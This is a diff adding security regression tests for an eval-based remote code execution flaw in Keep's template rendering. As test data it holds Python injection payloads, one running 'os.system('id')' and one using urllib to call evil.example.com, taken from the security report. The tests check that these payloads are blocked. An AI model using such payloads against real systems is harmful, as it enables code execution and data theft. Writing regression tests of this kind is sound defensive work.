@@ -1073,3 +1073,84 @@ def test_fn_upper_lower_strip_on_present_value(mocked_context_manager):
 
     strip = iohandler.render("{{#fn.strip}}{{ alert.env }}{{/fn.strip}}")
     assert strip == "Production", f"fn.strip got '{strip}'"
+
+
+# ── Security regression tests (RCE via eval) ─────────────────────────────────
+
+
+def test_rce_import_in_list_arg_is_blocked(context_manager):
+    """Ensure __import__ inside a list argument cannot execute arbitrary code.
+
+    Regression test for GHSA-p5pp-x5q2-hgm9: user-controlled alert data was
+    evaluated with Python's eval(), allowing arbitrary code execution through
+    crafted list literals such as [__import__('os').system('id')].
+
+    With KEEP_SECURE_EVAL=true (always on for managed platform), the malicious
+    payload is treated as a plain string by ast.literal_eval, so keep.len()
+    returns the string length instead of executing code.
+    """
+    import keep.iohandler.iohandler as iohandler_mod
+
+    payload = "[__import__('os').system('id')]"
+    context_manager.consts_context = {"some_var": payload}
+    iohandler = IOHandler(context_manager)
+    with patch.object(iohandler_mod, "KEEP_SECURE_EVAL", True):
+        result = iohandler.render("keep.len({{ consts.some_var }})")
+    assert result == str(len(payload))
+
+
+def test_rce_urllib_payload_is_blocked(context_manager):
+    """Ensure urllib __import__ payload cannot exfiltrate data.
+
+    Regression test for the exact payload from the security report.
+    The malicious string is treated as a plain string — no network request
+    is made, no code is executed.
+    """
+    import keep.iohandler.iohandler as iohandler_mod
+
+    payload = (
+        "[__import__('urllib.request', fromlist=['urlopen'])"
+        ".urlopen('https://evil.example.com').read()]"
+    )
+    context_manager.consts_context = {"some_var": payload}
+    iohandler = IOHandler(context_manager)
+    with patch.object(iohandler_mod, "KEEP_SECURE_EVAL", True):
+        result = iohandler.render("keep.mul(keep.len({{ consts.some_var }}), 1)")
+    assert result == str(len(payload))
+
+
+def test_rce_blocked_even_without_builtins_in_oss_mode(context_manager):
+    """Even in OSS mode (KEEP_SECURE_EVAL=false), __builtins__ is stripped
+    from the eval namespace so __import__ is not directly accessible."""
+    import keep.iohandler.iohandler as iohandler_mod
+
+    payload = "[__import__('os').system('id')]"
+    context_manager.consts_context = {"some_var": payload}
+    iohandler = IOHandler(context_manager)
+    with patch.object(iohandler_mod, "KEEP_SECURE_EVAL", False):
+        with pytest.raises(Exception, match="__import__"):
+            iohandler.render("keep.len({{ consts.some_var }})")
+
+
+def test_safe_list_literal_still_works(mocked_context_manager):
+    """Normal list literals should still be parsed correctly after the fix."""
+    mocked_context_manager.get_full_context.return_value = {
+        "steps": {"data": {"items": [1, 2, 3]}},
+    }
+    iohandler = IOHandler(mocked_context_manager)
+    result = iohandler.render("keep.len({{ steps.data.items }})")
+    assert result == "3"
+
+
+def test_safe_tuple_literal_still_works(context_manager):
+    """Tuple arguments should still work after the fix."""
+    iohandler = IOHandler(context_manager)
+    template = "keep.is_business_hours('2024-03-20T10:00:00+02:00', 8, 20, (0, 1, 2, 3, 6), 'Asia/Jerusalem')"
+    with patch(
+        "keep.functions.utcnow",
+        return_value=datetime.datetime(
+            2024, 3, 20, 8, 0, tzinfo=datetime.timezone(datetime.timedelta(hours=2))
+        ),
+    ):
+        result = iohandler.render(template)
+    assert result == "True"
